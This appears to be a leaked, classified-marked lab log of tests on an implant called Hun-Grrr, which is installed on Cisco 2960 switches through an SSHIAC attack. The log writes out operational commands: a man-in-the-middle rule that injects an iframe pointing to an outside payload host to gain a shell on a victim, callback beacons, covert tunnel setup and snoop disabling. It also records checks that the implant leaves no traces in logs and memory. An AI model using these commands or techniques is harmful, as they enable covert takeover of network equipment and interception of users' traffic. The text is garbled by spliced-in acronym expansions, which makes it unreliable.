@@ -1,0 +1,461 @@
+
+                        Owner: User #71467
+Aquaman-5h Test Notes
+TOP SECRET//NORFORN
+3/4/2015 - User #75335
+Followed README instructions to trigger HG.  Opened and setup Listening window first, then followed steps to open and setup Trigger window.  When I entered ./prep-ct.sh in the Trigger window, got the following message in the Listening window:
+Bus error (core dumped) - spoke with User #75338/Xetron about this.  He says this is because ./prep-ct.sh is only meant to be run once.  It is in the README to run twice because the README assumes you are not triggering and listening on the same VM.
+3/6/2015 - User #75335
+Was trying different things with the Seeds host to get HG to call back without an explicit IP to impersonate.  I edited the ifcfg-eth1 file on Seeds to remove the DOMAIN variable and then saved my changes to the file.  Then I restarted network services on the Seeds host so my changes would take effect.  Noticed that I could no longer ping the default gateway from the Seeds host.  Logged into network gear to verifiy connections and found 3750G g1/0/11 in err-disable state with syslog message %ETHCTR-3-LOOP_BACK_DETECTED: Loopback detected on Gi1/0/11, putting Gi1/0/11 in err-disable state.  I bounced the port to restore and it came up/up.  I also check the TOR-SW-1 and found g1/0/3 in the same state.  Bounced port to restore.  Went back to ICON VMVirtual Machine to attempt to trigger again and now Trigger packets are not successful, where they were before.  Ran tcpdump on the Seeds host that is the destination for the trigger packet and it actually does receive the trigger packet.  HG is no longer picking up the trigger packet.  Reloaded 2960S to reinstall HG, and without HG installed, ports no longer to into err-disable state when I issue service network restart on Seeds.  Successfully re-attacked with HG and still do not see the err-disable issue.
+Testing Notes Summary
+
+SMITE filter rule traffic visible in debug messages if debug platform cpu-queue sw-fwd-q enabled
+HG accepts multiple mitm http_iframe filter rules for same traffic, but only lowest numbered rule injects iframe
+HG mitm injects Iframe after each <body> tag in the HTML, we saw multple iframes injected because our HTMLHypertext Markup Language has two <body> tags
+After SSHIAC attack, two new processes in show stacks - Xetron aware of SSHSecure Shell process, need to verify platform OBFL process
+When HG installed, output of show stacks does not show Init process - Xetron already aware
+After HG uninstalled, output of show stacks has many blank lines as well as a new IP input process - Xetron already aware
+HG visible in show controllers output, sw-forwarding counter incrementing - Xetron already aware
+HG visible in Used/Free memory when it is installed - Xetron already aware
+Observed the following ECEdgeCase (not in readme) during SSHIAC attack - ECEdgeCase 159 and ECEdgeCase 60 - Xetron confirmed these are benign and are related to GDBGNU debugger session closing
+CPU spikes observed during SSHIAC attack, HG install and HG SSLSecure Socket Layer Handshake - known issue, could verify levels of spike
+Encountered an issue with ports on switches connected to target 2960S switch (while HG installed) changing state to err-disable - current testing indicates that this occurs when HG is installed, but there is no cutthroat session active and service network restart is issued on Fedora10 Seeds host.
+
+ 
+Progress / Notes
+
+TR team has performed initial review of configuration and Ops provided diagrams
+TR team is moving required VMs at this time
+Created Blot-Proxy, Blot-Onslaught, Blot-CoverWeb, ICON-CutThroat VMs.  Copied Fedora10-hg2960-Seeds VMVirtual Machine from NDBNetwork Devices Branch Lab to use for seed traffic.
+Built test network with 2960S-24TS-L target switch, 3750G-24T Router and 3 2960-24TT-L switches.
+Upgraded IOSApple operating system for small devices on target 2960S switch to c2960s-universalk9-mz.122-55.SE7.bin.  Updated confiugration to match config obtained from COG.
+Uploaded Aquaman delivery package to ICON-CutThroat VMVirtual Machine and installed in /home/ubuntu.
+Successfully attacked target 2960S switch with SSHIAC and installed Hun-Grrr. Note:
+On ICON-CutThroat VMVirtual Machine - had to move to Devlan temporarily to download the ia32-lib from the repo in order for SSHIAC to run
+Must enable the root account and su - root in each window you use when you attack with SSHIAC and use CutThroat
+
+
+Modified Seeds scripts on Fedora10-hg2960-Seeds VMVirtual Machine to generate ICMP/ARP, DNSDomain Name System and HTTPHypertext Transfer Protocol traffic in our test network.
+Established comms between Hun-Grrr and ICON-Cuthroat VM.
+Used beacon get_current_trigger_number and beacon set_current_trigger_number to make sure HG trigger sequence number was correct
+Had successful trigger packets however did not receive a callback
+
+User #75337/Xteron recommended to use beacon call_me_back https 443 -ii 172.31.255.2 and then finally comms came up, successful SSLSecure Socket Layer handshake in listening window.
+
+
+Created new WebServer VMVirtual Machine to use as web destination for seed traffic - 172.20.13.25.
+Created new BINDDNSDomain Name System server software DNSDomain Name System server VMVirtual Machine to resolve WebServer domain.  New BINDDNSDomain Name System server software server has google.com, cnn.com and blot.com zones.
+IXIA added to the topology for traffic generation. Port 11 on IXIA to 0/1 on 3750 and IXIA Port 20 to 2960S 1/0/24
+Spoke with Operator and discussed network topology and CONOP.  We will need to update our testbed architecture to more closely match operational network.
+Installed Flux on FluxHost VM
+Copied Windex and Windex Target VMs to Test Range from NDBNetwork Devices Branch lab for use in SMITE testing
+Re-configured topology based on latest 2960 configs from Operator.
+Fixed issue with Seeds traffic - added second DNSDomain Name System server and moved both DNSDomain Name System servers and Web server into public IP space.  HG comms now established without specifying a host to impersonate.
+Successfully tested HG SMITE functionality using Windex-Victim-WinXPProSP3 (192.168.21.11), Windex (X.X.X.XX (LVLT-GOGL-8-8-8[US])), and our WebServer (X.X.X.XX (LVLT-GOGL-8-8-8[US])).
+
+User #75333/Xetron recommends always using the -bc and -bk flags when creating the mitm rule.  This bypasses compression and chunking, and SMITE did not work in our test scenario without these flags.
+
+User #75336/Xetron noted that the iframe is injected after the <body> tag, and if the body tag is split into two packets, HG will not add the iframe
+mitm create http_iframe 192.168.21.11 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk
+
+
+Installed 12.2(50)SE5 on 2960#3 for use in testing Tunnel
+Copied RANCID VMVirtual Machine from NDBNetwork Devices Branch Lab up to TestRange and configured for use on JQJTHRESHER testing
+Reviewed Test Plan with team
+Discussed CONOPConcealed Operation of use of Flux with Dualor Tunnel with Operator
+Implanted 2960#3 with aquaman-3h survey delivery of HG and established comms from ICON-CT.
+Completed the following Smoke Tests against the target 2960-S:
+Attack with SSHIAC
+SSHIAC produced the following out on CutThroat during install - LG EC-125 DHDiffie-Hellman encryption EC-60 EC-159 M
+Five second CPU on Target 2960-S hit 66% as a high during the SSHIAC attack, One minute - 22%, Five minute - 11%
+No commands seen in history
+No syslog messages generated
+Memory used increased by ~50k
+
+
+Installed HG - Aquaman-5h
+Installed with no delay set between packets
+Five second CPU hit 25% during install - note this is with 0 delay between packets
+Memory used increased by 2.8M after install from baseline
+No syslog messages generated
+
+
+Establish Comms with ICON-CT
+Five second CPU hit 19% during SSLSecure Socket Layer Handshake with ICON-CT
+No significant change to memory used (~1k)
+
+
+SMITE capability
+Successfully injected an Iframe into a web request and established a shell term connection with Windex
+Filter applied: mitm create http_iframe 192.168.21.11 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 80 80 "http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -en -bc -bk
+Note that -bc and -bk flags aree recommended by User #75339/Xetron for standard use because they offer the best chance of success.  These flags will bypass compression and chunking, and in fact SMITE does not work in our test environment without these flags configured.
+Five second CPU did not change from baseline - no noticeable spike
+No syslog messages generated.
+Took two screenshots - one of windex shellterm connection and one of victim source code showing Iframe for Test Report
+
+
+CI Test
+Used RANCID to compare configuration of Target 2960-S before any testing and configuration after previous smoke tests completed - RANCID found no change
+There were CPU spikes during SSHIAC and HG install, however these are known.  Need to confirm our CPU spikes are within expected levels.
+There was a change in the memory used after HG install, need to confirm if this is expected and within norms.
+Need to eyeball the output from show-tech from before and after to look for any anamolies - found output from show controllers - line sw forwarding is 0 untile HG installed, at which point it begins incrementingadditional things to track down from sh tech - exec process, remote command vtp, show stacks - difference in processes listed
+
+Found no change to files or file sizes on file system
+Note that there is no "test platform debugger dumpmem" command available on this 2960-S.  Based on PW's Kingpin test report, this is the only IOSApple operating system for small devices (except ROMMONRead-Only Memory Monitor Cisco bootstrap program commands) that will allow inspection of HG memory.
+Time permitting could perform additional hidden commands
+
+
+
+
+Completed the following Performance Tests against the target 2960-S
+Used IXIA Breaking Point to generate traffic and establish a baseline performance for the 2960-S.  IXIA cabled to 2960-S (g1/0/24) on one side and 3750G (g1/01/) on the other.  Traffic configured as follows:
+AppSim test component with BreakingPoint-Enterprise traffic profile
+Maximum bandwidth 75Mbps (while IXIA connects to Gigabit ports, the link between the IXIA and the 3750G is FastEthernet)
+20 simulated hosts on 192.168.0.0/25 (VLANVirtual Local Area Network 1)
+50 simulated hosts on 192.168.21.0/24 (VLANVirtual Local Area Network 21)
+
+
+During a 1 hour Baseline test without HG installed, target 2960-S one minute and five minute CPU Utilization remained steady at 6%.  Five second CPU had small spikes with a maximum of 39%.
+During 30 minute Performance test with HG installed, target 2960-S CPU recorded higher results than the baseline without HG:
+During SSHIAC attack, five second CPU had spikes to 57% and 54% for two minutes in row during SSHIAC attack, and one minute CPU was observed as high as 21% on show proc cpu sorted, and shows 30% on a show proc cpu history
+During HG install, five second CPU spiked to 28%
+During HG SSLSecure Socket Layer handshake with ICON-CT, five second CPU spiked to 18%
+Once HG was installed and comms established, CPU levels returned to what was observed during Baseline performance test without HG - one minute and five minute CPU levels at 6%, largest value for five second CPU was 9%.
+No significant change to CPU observed from Baseline during successful SMITE attack - largest five second CPU spike observed was 9%.
+
+
+
+
+Samsonite Test Case - Uninstall HG and re-attack
+Reloaded 2960-S to start with a clean target device
+Attacked with SSHIAC, installed HG and established comms
+Attempted uninstall hg command device uninstall_hg - this command fails with error that says you must use -f flag
+Attempted uninstall hg command device uninstall_hg -f - then typed yes to confirm, result success.
+Checked used memory on the target 2960-S and the memory has gone back to down normal level without HG installed (may be slight difference, need to do the math), no syslog messages, no CPU spike
+Re-attacked using SSHIAC, installed HG, established HG comms - no anomalies
+Uninstalled HG again using device uninstall_hg -f - no anomalies
+No syslogs
+Used memory back to normal - could check math to find a small difference
+
+
+
+
+Samsonite Test Case - Dropped connection during HG install
+Reloaded 2960-S to start with a clean target device
+Added 1 second of delay to HG upload in remote configuration file
+Attacked with SSHIAC
+Entered hg_start and after just a few chunks were sent, shut int g1/0/11 via console connection on 2960-S to simulate network outage
+ICON-CT reported HG install failed
+No syslog messages from switch
+Used memory still shows higher than it should, but not as high as if HG were installed - 27265180 (b)
+Issued no shut on 2960-S interface g1/0/11 to re-enable the connection
+Entered hg_start on ICON-CT and HG successfully uploaded - used memory after successful install - 29607324 (b)
+
+
+Samsonite Test Case - Attempt to install HG when HG already installed
+Cannot initiate hg_start again via remote - reports comms failure
+Attempted to re-attack with SSHIAC - seemed to go through normal SSHIAC install process, however at the end of the install, could not establish comms with remote
+Broad didn't work
+hg_start fails
+
+
+Attempted to re-establish HG comms and that was successful
+
+
+Samsonite Test Case - Enable MITMMan-In-The-Middle attack rule and execute system administrator commands
+Enabled the SMITE MITMMan-In-The-Middle attack rule used above in HG
+Performed the following with no anomalies observed
+Cleared log buffer
+Disable/re-enable logging
+Multiple show commands - mac-address table, memory, proc cpu, proc cpu hist, log,run
+Write mem
+Add/delete a user
+Add/delete a VLAN
+
+
+Verified that SMITE works by web browsing from Victim VMVirtual Machine - collected output from Wireshark running on Victim VMVirtual Machine which shows Iframe
+
+
+Samsonite Test Case - Issue Cisco "test crash" command to test crash and generate a crashinfo
+With HG installed, issued test crash and selected reason as software forced crash
+Saved output of crashinfo file
+Saved log messages seen upon reboot of switch in log buffer
+Memory used had returned to normal levels for no HG, controller counters for sw forwarding back to 0
+Re-attacked with SSHIAC and installed HG and established HG comms successfully after test crash - with 1 second delay the five second CPU during HG install spiked to a max of 19%
+
+
+Without HG installed, repeated test crash - need to compare crashinfo
+Reloaded 2960-S to remove HG
+Issued "test crash" command with software forced crash as reason
+Saved output of crashinfo file
+Saved syslog messages seen up reboot of switch in log buffer - log messages are the same as seen on test crash with HG
+
+
+
+
+Samsonite Test Case - Perform core dump of 2960-S
+Performed a write core and saved to TFTPFile transfer software server - both before and after HG install.
+Need to compare these files
+
+
+Trigger and Callback through a HG Tunnel running Aquaman-3h on 2960
+Updated 2960#1 to 12.2(50)SE5 and implanted with Aquaman-3h delivery of HG
+Established comms with Aquaman-3h from ICON-CT on port 443
+Disabled setting in Aquaman-3h HG tunnel which will disable the tunnel if the tap IP becomes active
+Edit hg/config/tunnel.ini and change DetectTAPSrcTraffic=Yes to No
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = Yes
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg tunnel.ini and note in the output that DetectTAPSrcTraffic has been changed to No
+From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = No
+From Aquaman-3h CutThroat, type file put cfs/000000004B8FAF63.cfg default:000000004B8FAF63.cfg in order to load the new setting up to HG
+From Aquaman-3h CutThroat, type module restart default:CovertTunnel.mod to restart the moduleThis did not work initially and Xetron is aware of this problem.  To fix, try restarting again, and run ilm refresh.
+
+
+
+Establish Dualor tunnel with tap IP 192.168.0.110
+From /hg/tools/dualor/linux, run ./Dualor .../configs/dualor-endpoint.ini and note that you get a message that CTCounter Terrorism is listening on port 444
+From Aquaman-3h CutThroat, run tun init tools/dualor/config/dualor-callback.ini and note that the SSLSecure Socket Layer session establishes
+Note that on ICON-CT VMVirtual Machine you know have a new interface called tap0 with an iP 192.168.0.110
+
+
+Add a route to ICON-CT for 192.168.21.0/24 to use tap0 interface - route add -net 192.168.21.0/24 dev tap0
+Move to Aquaman-5h setup - Edit aquaman-5h.txt Interface value under general settings to tap0, and set CommsH port to 445
+Establish HG comms using "beacon call_base_back https 192.168.0.110 445"
+Comms successfully established through Aquaman-3h tunnel
+Configured mitm rule for SMITE as in tests above and successfully exploited Victim VMVirtual Machine and read secrets.txt from Windex
+
+
+Samsonite Test Case - Create MITMMan-In-The-Middle attack rule for SMITE multiple times
+Created the MITMMan-In-The-Middle attack rule twice in a row - command successful both times and two identical rules present in mitm show output
+Created a third identical MITMMan-In-The-Middle attack rule - now there are three identical MITMMan-In-The-Middle attack rules
+Iframe injection on Victim VMVirtual Machine successful - only 1 Iframe injected
+Deleted the two additional rules and added a rule with same filter settings except different iframe string - only one iframe injected and it is for lowest numbered rule
+Deleted the lowest numbered rule so now only 1 rule applied - iframe is injected that matches remaining rule
+Noticed that in our test setup HTMLHypertext Markup Language we have two body tags, and we actually get two iframes injected - one after each body tag, which results in two shellterm connection ids in Windex
+When multiple MITMMan-In-The-Middle attack rules are present for the same traffic, lowest numbered rule is the action performed
+
+
+Samsonite Test Case - Reload FilterBroker.mod while mitm rule enabled
+Created a mitm rule and verified functionality by viewing source on the Victim VM
+On CutThroat session, entered module restart default:FilterBroker.mod
+Issued module show and saw two copies running - one status ModuleStopped, one status ModuleRunning
+Issued ilm refresh to attempt to clear the old copy of FilterBroker - however two copies still present in module show
+Ran mitm show and found no rules - restarting the module had deleted our rule
+Re-added a mitm rule and verified functionality by checking for the Iframe on Victim VM
+Checked module show and found that now, only one copy - status ModuleRunning - is present
+
+
+Installed new 2960-S with PoE
+Smoke Test - Install Aquaman-5h on PoE 2960-S
+Attack 2960-S with SSHIAC
+Five second CPU hit 58% during SSHIAC
+Observed same error codes in SSHIAC output as with non PoE 2960-S
+
+
+Install HG on 2960-S
+Five second CPU hit 26% during HG install
+No commands seen in history
+No syslog messages generated
+Used memory increased as expected
+
+
+Establish comms with ICON-CT
+Five second CPU spiked to 19% during SSLSecure Socket Layer handshake
+Successfully established HG comms
+
+
+
+
+Smoke Test - Trigger and Callback through a HG Tunnel running Aquaman-3h on 2960 (2960-S with PoE)
+Establish Dualor tunnel with tap IP 192.168.0.100
+From /hg/tools/dualor/linux, run ./Dualor .../configs/dualor-endpoint.ini and note that you get a message that CTCounter Terrorism is listening on port 444
+From Aquaman-3h CutThroat, run tun init tools/dualor/config/dualor-callback.ini and note that the SSLSecure Socket Layer session establishes
+Note that on ICON-CT VMVirtual Machine you know have a new interface called tap0 with an iP 192.168.0.110
+
+
+Add a route to ICON-CT for 192.168.21.0/24 to use tap0 interface - route add -net 192.168.21.0/24 dev tap0
+Move to Aquaman-5h setup - Edit aquaman-5h.txt Interface value under general settings to tap0, and set CommsH port to 445
+Establish HG comms using "beacon call_base_back https 192.168.0.110 445"
+Comms successfully established through Aquaman-3h tunnel
+Configured mitm rule for SMITE as in tests above and successfully exploited Victim VMVirtual Machine and read secrets.txt from Windex
+
+
+Observation - we have two <body> tags in our HTMLHypertext Markup Language on our web server for google.com.  When SMITE injects an iframe, we actually get two iframes inserted, once after each body tag.  This does not appear to cause any issues however we do get two session ids in shellterm.
+Samsonite Test - Reload 2960-S during HG install
+Reloaded target 2960-S to start with a clean target device
+Attacked with SSHIAC
+Set remote interpacket delay to 1s to allow me to time the reload halfway through HG install
+Initiated HG install and reloaded the switch at the 50% User #75334
+
+Did not see any unusual syslog messages, switch boots normally
+Remote reports "FAILED retry (yes/up/down/fail)?  Selected fail and remote gives a Traceback and exits
+Re-attack with IACInternational Access Code - successful and looks normal
+Initiated HG install and allow installation to complete - Installation successful
+Established HG comms successfully
+
+
+Samsonite Test Case - Debug all
+With HG installed from previous test, entered debug all just to see what would happen and lost all ability to HG comms with switch, interact on vty or console.  Collected a bunch of output and then hard reset.  Had to kill CTCounter Terrorism listen window because HG prompt would not return in order to gracefully exit with quit command.
+Got a bunch of unusual error messages on the console when the switch came back up.  Need to investigate these and see if these messages appear without HG.
+After switch reloaded, output of show debug showed persistent variable debugging is currently set to All.  Not sure why that would be since the switch just reloaded and all other debugging was off.  Entered undebug all to disable it.
+Repeating the debug all and hard reset, this time without HG and the results are the same - persistent variable debugging is set to on when switch reboots.  Need to compare output of error messages.
+
+
+Samsonite Test Case - CIConcern - SMITE with Cisco debug platform cpu-queue sw-fwd-q set to on
+Enable debug on Cisco, but do not enable SMITE rule and then web browse from SMITE victim - Note that no debug output is seen on console of 2960-S
+Now enable SMITE rule and then web browse from SMITE victim - Note output on console of 2960-S*Mar 1 00:57:33: SW-FWD-Q:IP packet: Local Port Fwding L3If:Vlan1 L2If:GigabitEthernet1/0/6 DI:0x1E9, LT:7, Vlan:1 SrcGPN:6, SrcGID:6, ACLLogIdx:0x0, MacDA:0011.bb89.21c4, MacSA: 0050.5688.40eb IP_SA:192.168.21.11 IP_DA:X.X.X.XX (LVLT-GOGL-8-8-8[US]) IP_Proto:6  TPFFD:DAC00006_00010001_01A00131-000001E9_276B0000_00000000
+
+
+
+CI Smoke Test
+After IACInternational Access Code attack, output of show stacks shows
+New SSHSecure Shell process
+New Platform OBFL process
+
+
+After HG install, output of show stacks still includes the two new processes, but now missing Init process - called Xetron, this is tracked under EAREnterprise Archive 5163
+After HG comms established, output of show stacks command looks identical as after HG install
+After running SMITE against Victim VM, output of show stacks shows no change
+After uninstall of HG
+Init process returned
+New IP input process present
+New Blank process present
+SSH Process still present (since IACInternational Access Code attack)
+Platform OBFL still present (since IACInternational Access Code attack)
+Bunch of blank lines, then \Vx~ - Called Xetron, this is tracked under EAREnterprise Archive 5012
+
+
+
+
+CI Smoke Test - Output of show chunk
+Reloaded target 2960-S to start with a clean target device
+Collected show chunk output before any attack, after hg install and after hg uninstall
+Noticed different number of sibling processes but that looks like it changes regularly with normal operations
+Names of processes are the same
+
+
+Attempt to reproduce err-disable state
+On seeds host, modified the ARPAddress Resolution Protocol Seeds script to also ping and arp to 172.20.12.22 (ICON-CT)
+Installed HG on 2960S
+On seeds host, edited ifcfg-eth1 to remove DOMAIN variable
+Entered service network restart - ports changed to err-disable on TOR-SW-1 and 2960#1
+Reproducible with one or two service network restarts - every time, ports go err-disable
+Reload 2960S to remove HG
+Entered service network restart on Seeds multiple times - no err-disable condition
+Edited ifcfg-eth1 to add DOMAIN variable, service network restart multiple times - no err-disable condition
+Edited ifcfg-eth1 to remove DOMAIN varibale, service network restart multiple times - no err-disable condition
+Put HG back on and did service network restart on Seeds- err-disable condition occurs
+Fixed err-disable condition by shut/no shut and then tried disable/enable LAN3 on Windows XPWindows operating system (Version) Victim - no err-disable condition
+Went back to Seeds (Fedora10) and entered service network restart - err-disable
+Shut seeds traffic off and entered service network restart on Seeds - err-disable
+Reload 2960S to remove HG, shut no shut on all the err-disable ports to fix, leaving Seeds traffic shut off to see if that will prevent the condition from occurring
+Did service network restart multiple times on Seeds, added and removed the DOMAIN variable with service network restart after each edit - could not recreate err-disable condition.  During all this, no seeds traffic running.
+Put HG back on switch
+Entered service network restart - on the first time, no problem, entered it twice and the err-disable condition happened
+Put an Ubuntu VMVirtual Machine on the same VLANVirtual Local Area Network with same IP address and entered service network restart multiple times and rebooted the host - no err-disable
+Put Seeds VMVirtual Machine back in place - and err-disable condition is present after editing ifcfg-eth1 to include a DOMAIN variable, then removing it.  After that, service network restart triggers the err-disable condition
+Reloading 2960-S to try again to reproduce without HG
+Entered service network restart multiple times and edited the DOMAIN variable and did another service network restart - could not reproduce
+Installed HG - was able to reproduce
+Established comms with HG - could not reproduce
+Quit the comms session with HG and could reproduce again
+
+User #75331/Xetron called to ask for a wireshark capture (inline preferred but span if that's all we have) of the problem ocurring and also a capture of the same steps with the Ubuntu host in place
+
+User #75332/Xetron also walked me through disabling snooping (web, dns, https) on HG.  He said normally, once a CTCounter Terrorism session is estalished, hg turns off snooping, so that is a difference.
+https change_snoop offcyle 1d
+https show to verify snoop setting
+repeat for web and dns
+
+
+Once snooping disabled, closed CTCounter Terrorism session and attemped to reproduce - could not, with multiple service network restarts and editing ifcfg file
+In order to narrow down which snoop service could be associated with the err-disable state, reloading HG fresh and disabling two of the three, and then testing
+Test 1 - leave only dns snooping enabled, then disconnected comms - was able to reproduce error after several service network restarts
+Test 2 - reload and start over, leaving only https snooping enabled and disconnect comms - was able to reproduce error after several service network restarts
+Test 3 - reload and start over, leaving only web snooping enabled and disconnect comms -  was able to reproduce after one service network restart
+
+
+
+
+Captured Wiresharks for Xetron
+One shows err-disable on first try
+One shows err-disable on third try
+One shows no HG, and 10 service network restarts with no err-disable
+One shows Ubuntu14Server in place of Seeds host, with HG, and 10 service network restarts with no err-disable
+
+
+
+TOP SECRET//NOFORN
+
+Previous versions:
+| 1 
+| 2 
+| 3 [Xetron]
+| 4 [Xetron]
+| 5 [Xetron]
+| 6 [Xetron]
+| 7 [Xetron]
+| 8 [Xetron]
+| 9 [Xetron]
+| 10 [Xetron]
+| 11 [Xetron]
+| 12 [Xetron]
+| 13 [Xetron]
+| 14 [Xetron]
+| 15 [Xetron]
+| 16 [Xetron]
+| 17 [Xetron]
+| 18 [Xetron]
+| 19 [Xetron]
+| 20 [Xetron]
+| 21 [Xetron]
+| 22 [Xetron]
+| 23 [Xetron]
+| 24 [Xetron]
+| 25 [Xetron]
+| 26 [Xetron]
+| 27 [Xetron]
+| 28 [Xetron]
+| 29 [Xetron]
+| 30 [Xetron]
+| 31 [Xetron]
+| 32 [Xetron]
+| 33 [Xetron]
+| 34 [Xetron]
+| 35 [Xetron]
+| 36 [Xetron]
+| 37 [Xetron]
+| 38 [Xetron]
+| 39 [Xetron]
+| 40 [Xetron]
+| 41 [Xetron]
+| 42 [Xetron]
+| 43 [Xetron]
+| 44 [Xetron]
+| 45 [Xetron]
+| 46 [Xetron]
+| 47 [Xetron]
+| 48 [Xetron]
+| 49 [Xetron]
+| 50 [Xetron]
+| 51 [Xetron]
+| 52 [Xetron]
+| 53 [Xetron]
+| 54 [Xetron]
+| 55 [Xetron]
+| 56 [Xetron]
+| 57 [Xetron]
+| 58 [Xetron]
+| 59 [Xetron]
+| 60 [Xetron]
+| 61 [Xetron]
+| 62 [Xetron]
+| 63 [Xetron]
+| 64 [Xetron]
+| 65 [Xetron]
+| 66 [Xetron]
+| 67 [Xetron]
+| 68 [Xetron]
+| 69 [Xetron]
+| 70 TOP SECRET [Xetron]
+|
+                    
